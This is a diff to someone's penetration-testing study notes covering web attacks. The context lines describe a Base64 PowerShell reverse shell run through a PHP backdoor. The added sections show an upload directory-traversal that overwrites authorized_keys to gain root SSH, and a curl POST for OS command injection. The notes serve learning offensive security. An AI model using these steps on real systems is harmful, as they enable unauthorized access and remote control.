@@ -477,11 +477,32 @@ $EncodedText =[Convert]::ToBase64String($Bytes)
 ~~~
 The variable '$EncodedText' contains the one line Power-Shell script which has been encoded in Base64.  The reverse shell is established by executing the PHP 'simple-backdoor.php' script using the cURL application.  The Base64 encoded script is passed to the 'simple-backdoor.php' script, which in turn establishes the reverse shell on port 4444.  The Netcat listener provides access to the reverse shell. 
 #### Non-Executable Files
-### SQL Injection
+Exploiting non-executable file vulnerabilities generally includes chaining two or more vulnerabilities together.  For example, we can try to use a directory traversal vulnerability in a file upload function and use this to overwrite the 'authorized_keys' file with one that includes our 'public key'.
+To do this we would need to create a ssh key pair and write the public key to a file called 'authorized_keys'.  We would then use Burp-suite to capture the HTTP request and change the file location using a directory traversal exploit.  Essentially, loading the authorized_keys file to the .ssh directory and overwriting the existing file.   In Burp suite, we would use the 'repeater' function.
+~~~ bash
+# create a ssh key pair and save the keys to a file called 'fileup'
+ssh-keygen
 
+# write the public key from the 'fileup' file to an 'authorized_keys' file
+cat fileup.pub > authorized_keys
+
+# upload the 'authorized_keys' file to the target machine using the directory traversal vulnerability to the /.ssh directory
+
+
+# use ssh on the correct port with the public key in the 'fileup' file to connect to the target
+ssh -p 2222 -i fileup root@target.com
+~~~
 ### OS Command Injection
 Web applications frequently need to interact with the underlying OS to undertake routine tasks like interacting with the file system.  Web applications should provide a specific API with prepared commands to interact with the OS which cannot be changed by user input.  These however are time consuming to create and maintain.  
-Frequently, developers rely on user input and then sanitise.  This means that user input is filtered cor any command sequences that might try to change the application's behavior.
+Frequently, developers rely on user input and then sanitise.  This means that user input is filtered for any command sequences that might try to change the application's behavior.
+For example, we maybe able to use a 'git clone' command in a input field on a web application.  If this string is passed directly to the OS, it may just run the command as if it was entered directly into a terminal.
+We can also try to run arbitrary commands on the web application using the cURL application.
+~~~ bash
+# using curl to run arbitrary commands
+# -X specify the http request verb
+# --data sends the specified data in a POST request to the http server in the same way that a browser does when a html form is completed
+curl -X POST --data 'Archive=ipconfig' http://192.168.0.1:8080/archive
+~~~
 ## Tags
 #enumeration
 #nmap 
